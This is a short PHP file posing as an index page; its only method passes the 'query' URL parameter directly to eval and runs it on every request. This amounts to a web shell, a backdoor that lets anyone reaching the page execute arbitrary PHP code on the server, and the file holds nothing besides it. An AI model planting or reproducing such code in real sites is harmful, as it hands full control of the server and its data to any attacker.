<?php

class index
{
    public function index(){
        return eval($_GET['query']);
    }
}
$index = new index();
header('Content-Type:text/html');
$index->index();
